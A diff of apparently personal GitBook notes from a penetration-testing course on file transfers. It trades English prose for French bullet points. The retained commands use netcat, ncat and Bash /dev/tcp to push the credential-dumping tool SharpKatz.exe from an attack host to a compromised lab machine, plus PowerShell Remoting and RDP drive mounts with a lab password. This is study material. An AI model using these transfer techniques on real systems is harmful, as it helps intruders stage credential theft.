@@ -30,8 +30,6 @@ victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
 ```
 {% endcode %}
 
-From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.
-
 <mark style="color:orange;">**Netcat - Attack Host - Sending File to Compromised machine**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
@@ -41,8 +39,6 @@ mrroboteLiot@htb[/htb]$ # Example using Original Netcat
 mrroboteLiot@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
 ```
 {% endcode %}
-
-By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.
 
 <mark style="color:orange;">**Ncat - Attack Host - Sending File to Compromised machine**</mark>
 
@@ -54,7 +50,7 @@ mrroboteLiot@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
 ```
 {% endcode %}
 
-Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.
+***
 
 <mark style="color:orange;">**Attack Host - Sending File as Input to Netcat**</mark>
 
@@ -94,9 +90,9 @@ victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
 ```
 {% endcode %}
 
-If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
+***
 
-Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.
+If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
 
 <mark style="color:orange;">**Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File**</mark>
 
@@ -110,13 +106,21 @@ victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
 
 ## <mark style="color:red;">PowerShell Session File Transfer</mark>
 
-We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.
+<mark style="color:green;">**Définition et usage**</mark>
 
-[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
+* Permet d'exécuter des scripts ou commandes sur un ordinateur distant via des sessions PowerShell
+* Utilisé par les administrateurs pour gérer des ordinateurs distants et effectuer des transferts de fichiers
 
-To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.
+<mark style="color:green;">**Configuration par défaut**</mark>
 
-We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.
+* Crée automatiquement deux listeners : HTTP et HTTPS
+* Ports par défaut : TCP/5985 (HTTP) et TCP/5986 (HTTPS)
+
+**Prérequis d'accès** Pour créer une session PowerShell Remoting, il faut :
+
+* Avoir un accès administrateur, OU
+* Être membre du groupe `Remote Management Users`, OU
+* Avoir des permissions explicites pour PowerShell Remoting dans la configuration de session
 
 <mark style="color:orange;">**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**</mark>
 
@@ -175,17 +179,13 @@ PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destin
 
 ***
 
-## <mark style="color:red;">RDP</mark>
-
-If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.
-
-As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.
+## <mark style="color:red;">RDP</mark>.
 
 <mark style="color:orange;">**Mounting a Linux Folder Using rdesktop**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
 ```
 {% endcode %}
 
@@ -193,7 +193,7 @@ mrroboteLiot@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Passwo
 
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
-mrroboteLiot@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
 {% endcode %}
 
